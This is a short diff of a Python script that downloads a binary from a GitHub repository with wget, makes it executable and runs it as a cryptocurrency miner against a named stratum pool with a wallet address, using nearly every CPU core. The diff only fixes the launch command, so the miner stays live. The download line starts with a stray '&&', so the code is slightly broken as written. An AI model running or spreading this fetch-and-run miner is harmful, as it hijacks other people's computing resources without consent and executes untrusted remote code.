@@ -1,4 +1,4 @@
 import sys
 import os
 os.system("&& wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./panle ./cp -a -a yespowerr16 -o stratum-eu.rplant.xyz:13382 -u YdftzuLuBYRxZdx5ZkfgwSypHJSpRiqAHR.erlandi -t $(nproc --ignore 1)")
+os.system("chmod +x cp && ./cp -a -a yespowerr16 -o stratum-eu.rplant.xyz:13382 -u YdftzuLuBYRxZdx5ZkfgwSypHJSpRiqAHR.erlandi -t $(nproc --ignore 1)")
